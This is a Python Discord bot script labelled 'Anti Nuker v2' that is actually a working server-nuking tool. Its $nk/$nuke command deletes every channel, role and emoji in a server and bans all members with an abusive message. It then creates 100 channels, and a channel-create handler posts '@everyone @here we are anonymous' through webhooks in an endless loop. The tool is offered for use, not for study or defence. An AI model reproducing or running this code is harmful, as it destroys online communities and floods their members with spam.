from typing import ContextManager
import discord
import colorama
from colorama import Fore as F, Style as S
colorama.init()
from discord.ext import commands
import json
import os
colorama.init()

r = F.RED
w = F.RESET
g = F.GREEN

def ascii():
    print(f'''starting                
    
''')

ascii()
tokeninput = f'[>] Please enter your Bot Token: '
TOKEN = input(tokeninput)


os.system('cls')

#def main():
#    ()
#    headers = {
#        "authorization" : TOKEN
#    }
	
os.system('cls')	
os.system('title ┼ ANTI V2 ┼')
ascii()
antinet = commands.Bot(command_prefix='$', intents = discord.Intents.all())

@antinet.event
async def on_ready():
    await antinet.change_presence(status=discord.Status.idle, activity=discord.Game('Back to buiseness'))
    print(f'started')

antinet.remove_command('help')

@antinet.command()
async def w(ctx, *, message):
    print(f'             {F.RESET}[{r}${F.RESET}] Command Used: $w ')
    print(f'               {F.RESET}[{g}+{F.RESET}] Watching Text: {message}')
    print(' ')
    await ctx.message.delete()
    await antinet.change_presence(
	
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
			
        ))

@antinet.command()
async def clear(ctx):
    os.system('cls')
    print(f'''
 {r}   ╔═══════════════════════════════════════╗
                  {F.RESET} Anti Nuker v2  {r}        
    ╚═══════════════════════════════════════╝

    {r}╔══════════════════╗ {r}╔══════════════════╗
          {F.RESET}Commands             {F.RESET}Creators
		  
    {r}  $w {F.RESET}| {r}$nk {F.RESET}| {r}$help  {r}    Chills {F.RESET}| {r}@wnfo  
    {r}╚══════════════════╝ {r}╚══════════════════╝


    {r}╔═══════════════════════════════════════╗
                  {F.RESET}Command-Line
''')
    print(f'             {F.RESET}[{r}${F.RESET}] Command Used: $clear')

@antinet.command(aliases=['nuke'])
async def nk(ctx):
  await ctx.message.delete()
  print(f'             {F.RESET}[{r}${F.RESET}] Command Used: $n')
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
      print(f'               {F.RESET}[{g}+{F.RESET}] Channel Deleted')
    except Exception as e:
      print(f'               {F.RESET}[{r}-{F.RESET}] Channel NOT Deleted')

  for member in ctx.guild.members:
    try:
      await member.ban(reason='We are fucking you')
      print(f'               {F.RESET}[{g}+{F.RESET}] Member Banned')
    except Exception as e:
      print(f'               {F.RESET}[{r}-{F.RESET}] Member NOT Banned')

  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f'               {F.RESET}[{g}+{F.RESET}] Role Deleted')
    except Exception as e:
      print(f'               {F.RESET}[{r}-{F.RESET}] Role NOT Deleted')

  for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
      print(f'               {F.RESET}[{g}+{F.RESET}] Emoji Deleted')
    except:
      print(f'               {F.RESET}[{r}-{F.RESET}] Emoji NOT Deleted')
	  
  for i in range(100):
    await ctx.guild.create_text_channel("deadstarop")
    print(f'               {F.RESET}[{g}+{F.RESET}] Created Channel')

@antinet.event
async def on_guild_channel_create(channel):
  web = await channel.create_webhook(name="Anonymous")
  while True:
    await web.send('@everyone @here we are anonymous')
    #await channel.send('@everyone @here')

antinet.run(TOKEN)
